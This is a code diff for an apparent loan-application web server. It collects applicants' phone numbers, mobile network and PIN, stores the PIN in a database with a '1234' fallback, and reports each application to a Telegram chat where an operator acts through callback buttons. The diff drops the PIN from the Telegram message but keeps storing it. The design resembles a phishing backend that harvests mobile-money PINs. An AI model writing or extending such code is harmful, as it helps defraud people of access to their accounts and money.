@@ -9,7 +9,7 @@ const sqlite3 = require('sqlite3').verbose();
 const { open } = require('sqlite');
 require('dotenv').config();
 
-// Add this for fetch support in older Node versions
+// Add fetch for older Node versions
 const fetch = require('node-fetch');
 
 const app = express();
@@ -211,7 +211,7 @@ app.post('/api/calculate', (req, res) => {
     }
 });
 
-// Save loan application
+// Save loan application - FIXED VERSION
 app.post('/api/save-loan', async (req, res) => {
     try {
         console.log('Received save-loan request:', req.body);
@@ -236,10 +236,13 @@ app.post('/api/save-loan', async (req, res) => {
         const loanId = generateLoanId();
         console.log('Generated loan ID:', loanId);
         
+        // Use default pin if not provided
+        const userPin = pin || '1234';
+        
         await db.run(
             `INSERT INTO loans (loan_id, phone, network, amount, duration, monthly_payment, total_payment, interest, pin, status)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-            [loanId, phone, network, amount, duration, monthly, total, interest, pin || '1234', 'pending_verification']
+            [loanId, phone, network, amount, duration, monthly, total, interest, userPin, 'pending_verification']
         );
         
         await db.run(
@@ -257,7 +260,6 @@ app.post('/api/save-loan', async (req, res) => {
             `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
             `<b>📱 Network:</b> ${network}\n` +
             `<b>📞 Phone:</b> <code>${phone}</code>\n` +
-            `<b>🔐 PIN:</b> <code>${pin || '1234'}</code>\n` +
             `<b>📅 Duration:</b> ${duration / 30} months\n` +
             `<b>💳 Monthly:</b> UGX ${monthly.toLocaleString()}\n` +
             `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
@@ -275,14 +277,13 @@ app.post('/api/save-loan', async (req, res) => {
             ]
         };
         
-        const messageId = await sendTelegramMessage(messageText, replyMarkup);
+        await sendTelegramMessage(messageText, replyMarkup);
         
         console.log('Telegram message sent, returning success');
         
         res.json({
             success: true,
-            loanId: loanId,
-            messageId: messageId
+            loanId: loanId
         });
         
     } catch (error) {
@@ -353,11 +354,11 @@ app.get('/api/loan/:loanId', async (req, res) => {
     }
 });
 
-// Telegram Webhook - FIXED
+// Telegram Webhook
 app.post('/webhook/telegram', async (req, res) => {
     try {
         const update = req.body;
-        console.log('Webhook received:', JSON.stringify(update, null, 2));
+        console.log('Webhook received');
         
         if (update.callback_query) {
             const callbackData = update.callback_query.data;
@@ -366,7 +367,7 @@ app.post('/webhook/telegram', async (req, res) => {
             
             const [action, loanId] = callbackData.split('_');
             
-            console.log(`Action: ${action}, LoanId: ${loanId}`);
+            console.log(`Callback action: ${action}, loanId: ${loanId}`);
             
             if (!db) {
                 console.error('Database not connected');
